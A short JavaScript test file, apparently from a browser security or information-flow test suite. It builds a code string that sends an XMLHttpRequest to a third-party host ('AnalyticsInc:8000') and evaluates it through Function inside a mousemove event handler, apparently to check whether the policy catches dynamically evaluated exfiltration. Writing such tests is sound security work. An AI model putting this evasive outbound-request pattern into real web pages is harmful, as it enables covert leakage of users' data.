// exfil_test_onmousemove2.js
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onmousemove2", true);xmlhttp.send(null);';
document.getElementById("test").addEventListener("mousemove", JAM.call(Function, null, [exp]), false)
